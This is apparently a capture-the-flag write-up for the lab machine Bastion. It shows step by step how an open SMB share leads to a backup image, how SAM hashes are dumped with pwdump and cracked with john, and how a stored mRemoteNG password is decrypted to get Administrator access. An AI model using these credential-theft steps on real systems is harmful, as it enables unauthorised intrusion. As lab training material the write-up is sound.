<center><h1>Bastion</h1></center>
<br>
<center><h3>Summary</h3></center>
<br>
- Access an open SMB share to find a full Windows backup file
- Grab the SAM hases and crack the password
- mRemoteNG is install and the password is stored inside the configuration file
- Use credentials to SSH as Administrator
<br><br>
First we start with an Nmap scan

```
# Nmap 7.70 scan initiated Wed May 22 14:41:53 2019: nmap -sV -sC -T4 10.10.10.134
Nmap scan report for 10.10.10.134
Host is up (0.038s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -46m34s, deviation: 1h09m15s, median: -6m36s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-05-22T20:35:28+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-05-22 14:35:27
|_  start_date: 2019-05-19 22:23:54

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 22 14:42:11 2019 -- 1 IP address (1 host up) scanned in 17.97 seconds
```
<br>
A few ports open. Lets take a look at SMB. Running a quick smbmap we will see that there is a <b>Backups</b> directory that we have <b>READ, WRITE</b> privileges to.
```
# smbmap -u invalid -H 10.10.10.134
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.134...
[+] IP: 10.10.10.134:445        Name: 10.10.10.134                                      
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS
        IPC$                                                    READ ONLY
```
Next thing I did was connect to the <b>Backups</b> share folder. Once connected I was able to see a few files but the ones that interested me were the <b>notes.txt</b> and <b>WindowsImageBackup</b>.
```
# smbclient -U none //10.10.10.134/Backups password
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 17:48:51 2019
  ..                                  D        0  Tue Sep 17 17:48:51 2019
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  rEFqURGnaS                          D        0  Tue Sep 17 17:48:51 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019
  ZWSfrgOAqs                          D        0  Tue Sep 17 17:42:12 2019

                7735807 blocks of size 4096. 2757009 blocks available
```
The <b>notes.txt</b> file mentions that I dont need to donwload the entire Windows Backups image to our host machine.
```
smb: \> more note.txt
Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```
Instead of wasting time and downloading the files from the share, I decided to mount it. Before I was able to mount it I had to install a few things
```
# sudo apt install nfs-common
# sudo apt install cifs-utils
# sudo apt install libguestfs-tools
```
Once all those were downloaded I was able to mount the drive
```
mount -t cifs //10.10.10.134/Backups /mnt/Bastion
```
If you look around the <b>WindowsImageBackup</b> directory the you should ifnd two <b>.vhd</b> files.
```
# ls
9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
<output omitted>
```
To mount the <b>.vhd</b> files I used the tool <b>guestmount</b>.
```
# guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd
```
After enumerating around the box I realized I wont find any flags at this time. Next step was to dump the hashes from the SAM file. The SAM file is located at <b>Windows/System32/config</b> but it can't be access like any old file. To extract the hashes we will use a tool called <b>pwdump</b>.
```
# pwdump SYSTEM SAM

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```
Next I am going to use john to crack the hash. First we need to copy the hashes to a text file and the start john
```
# john --format=NT -w=/usr/share/wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Administrator)
bureaulampje     (L4mpje)
```
Now we have a password <b>bureaulampje</b> for the user <b>L4mpje</b>. We can use this to SSH in. From this point we can grab the user flag located at <b>C:\Users\L4mpje\Desktop</b>.
```
l4mpje@BASTION C:\Users\L4mpje\Desktop>dir                                                       
 Volume in drive C has no label.                                                                 
 Volume Serial Number is 0CB3-C487                                                               

 Directory of C:\Users\L4mpje\Desktop                                                            

22-02-2019  16:27    <DIR>          .                                                            
22-02-2019  16:27    <DIR>          ..                                                           
23-02-2019  10:07                32 user.txt                                                     
               1 File(s)             32 bytes                                                    
               2 Dir(s)  11.292.332.032 bytes free                                               
```
After doing some serious enumerating I was able to find that mRemoteNG is installed on the system. Some further enumeration revealed a XML configuration file located at <b>C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml</b>. Reading the XML file I noticed the username <b>Administrator</b> along with something that resembles a password hash.
```
<Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a                     -44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVq                                                        
tKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" Hostname="127.0.0.1" Protocol="RDP                 " PuttySession="Default Settings" Port="3389" ConnectToConsole="false"
```
My next thought was to decrypt the hash. After consulting my friend google, I was able to find something that could help me. These two links will help decrypt the password *[One](https://github.com/kmahyyg/mremoteng-decrypt)* and *[Two](https://github.com/kmahyyg/mremoteng-decrypt/releases)*.

Once you have everything ready we can now decrypt the hash.
```
# java -jar decipher mremoteng.jar aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==

User input: aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Use default password for cracking...
Decrypted output: thXLHM96BeKL0ER2
```
Last we can use the decrypted password to log in as Administrator and grab the flag. You can find the root flag in <b>C:\Users\Administrator\Desktop</b>
```
administrator@BASTION C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.                                                                               
 Volume Serial Number is 0CB3-C487                                              

 Directory of C:\Users\Administrator\Desktop                                                              

23-02-2019  10:40    <DIR>          .                                                  
23-02-2019  10:40    <DIR>          ..                                                               
23-02-2019  10:07                32 root.txt                                                            
               1 File(s)             32 bytes                                                             
               2 Dir(s)  11.291.758.592 bytes free
```
<br><br><br>
